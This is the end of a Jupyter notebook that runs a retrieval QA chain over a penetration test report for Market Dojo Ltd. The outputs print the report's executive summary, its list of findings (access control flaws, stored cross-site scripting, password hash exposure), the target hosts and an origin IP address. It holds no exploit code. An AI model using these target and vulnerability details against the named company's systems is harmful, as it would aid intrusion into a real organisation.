Test\\n\\nPage 16 of 16\", metadata={'source': '/app/data/Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf'}),\n",
       "  Document(page_content='Application and Organisation Penetration Test\\n\\nCreated for:\\n\\nNicholas Martin, Market Dojo Ltd.\\n\\nWritten by:\\n\\nMaleehah Lohani, Sam Lazarus\\n\\nVersion:\\n\\n1.0\\n\\nReference:\\n\\nM23-1042\\n\\nDate:\\n\\n8th of May 2023\\n\\nTable of Contents\\n\\nTable of Contents\\n\\nDocument Control Executive Summary\\n\\nKey Findings Recommendations\\n\\nApplication and Organisation Penetration Test\\n\\nEngagement Details\\n\\nSummary\\n\\nWeb Application Test External Penetration Test\\n\\nPenetration Test Findings\\n\\nBroken access control on zipped documents - HIGH\\n\\nBroken access control on documents - HIGH Stored cross site scripting - MODERATE\\n\\nPassword hash exposure - MODERATE\\n\\nInvalid TLS certiﬁcates - LOW\\n\\nHTTP Strict Transport Security not enforced - LOW\\n\\nLack of Content Security Policy - INFORMATIONAL\\n\\nNetwork services publicly exposed - INFORMATIONAL\\n\\nAppendix A: Project Management\\n\\nAssumptions and Limitations\\n\\nRisk Rating Methodology\\n\\nAbout Mercury\\n\\nMarket Dojo Ltd. (M23-1042) Application and Organisation Penetration Test\\n\\n2\\n\\n3 4\\n\\n4 4 5\\n\\n5\\n\\n5\\n\\n5 5\\n\\n6\\n\\n6\\n\\n7 8\\n\\n10\\n\\n11\\n\\n12\\n\\n13\\n\\n14\\n\\n15\\n\\n15\\n\\n15\\n\\n16\\n\\nPage 2 of 16\\n\\nDocument Control\\n\\nVersion\\n\\nDate\\n\\nAuthor\\n\\n0.1\\n\\n1 May 2023\\n\\nMaleehah Lohani, Sam Lazarus\\n\\n0.2\\n\\n8 May 2023\\n\\nEdward Farrell, Sam Lazarus\\n\\n1.0\\n\\n8 May 2023\\n\\nEdward Farrell\\n\\nMarket Dojo Ltd. (M23-1042) Application and Organisation Penetration Test\\n\\nComments\\n\\nOriginated\\n\\nPeer Review\\n\\nRelease\\n\\nPage 3 of 16\\n\\nExecutive Summary\\n\\nMarket Dojo is a SaaS software solution for procurement professionals that provides their customers with the opportunity to centralise their information and negotiate the best value for goods and services.\\n\\nRecommendations\\n\\nImmediate Actions\\n\\nMarket Dojo has sought a web application and an external penetration test to assess and assure its digital assets are secured. Mercury Information Security Services (Mercury) has conducted a penetration test of which the ﬁndings have been detailed below.\\n\\nKey Findings\\n\\nImplement the recommended ﬁxes for the high severity access control issues detailed in the ﬁndings section below. The ﬁxes would involve adding authorisation checks at the aﬀected endpoints.\\n\\nImplement the recommended ﬁx for the cross-site scripting vulnerability detailed below, which would require adding user input sanitisation at the aﬀected endpoint.\\n\\nThe external, internet-facing infrastructure of Market Dojo is generally well secured, with all of the vulnerabilities related to the external environment being of low risk. However, some high severity access control related vulnerabilities were discovered in the web application which would allow a malicious user to retrieve sensitive information of other organisations. Additionally, a cross-site scripting vulnerability was found which would allow a malicious user to take over other superhost user accounts on the site.\\n\\nThe table above illustrates the number and severity of issues.\\n\\nOngoing Activities\\n\\nWe recommend that the access control and cross-site scripting vulnerabilities are tested more thoroughly during the software development lifecycle, which will help to prevent these vulnerabilities from being introduced into the application.\\n\\nAdditionally, we would recommend incorporating application source code review into penetration tests performed in the future. Application source code review can help to reveal vulnerabilities that the usual “black box” style testing cannot.\\n\\nMarket Dojo Ltd. (M23-1042) Application and Organisation Penetration Test\\n\\nPage 4 of 16\\n\\nApplication and Organisation Penetration Test\\n\\nEngagement Details\\n\\nDates:\\n\\nTuesday, 17 April 2023 to Thursday, 20 April 2023\\n\\nTargets:\\n\\nWeb Application: https://sourcing.marketdojo.com/users/sign_in\\n\\nExternal: *.marketdojo.com\\n\\nOrigin IP:\\n\\n52.62.158.131\\n\\nSummary\\n\\nThe areas of focus for this assessment were the Market Dojo web application and the Market Dojo internet-facing external infrastructure.\\n\\nWeb Application Test', metadata={'source': '/app/data/Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf'})]}"
      ]
     },
     "execution_count": 39,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "response\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "id": "12f73de7-d5af-4f22-9434-30103fee27c8",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "' A malicious user could potentially view sensitive information of other organisations, or take over other superhost user accounts on the site. '"
      ]
     },
     "execution_count": 40,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "response['result']\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2689cd08-93a1-4af8-acdc-d862c4c7cff3",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
